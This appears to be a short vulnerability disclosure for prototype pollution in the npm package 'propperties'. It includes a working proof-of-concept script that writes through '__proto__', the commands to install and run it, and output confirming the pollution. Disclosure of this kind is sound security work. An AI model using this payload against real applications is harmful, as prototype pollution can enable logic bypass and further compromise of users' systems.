# Description

Prototype Pollution in propperties

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var propperties = require("propperties")
var obj = {}
console.log("Before : " + {}.polluted);
propperties(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i propperties # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
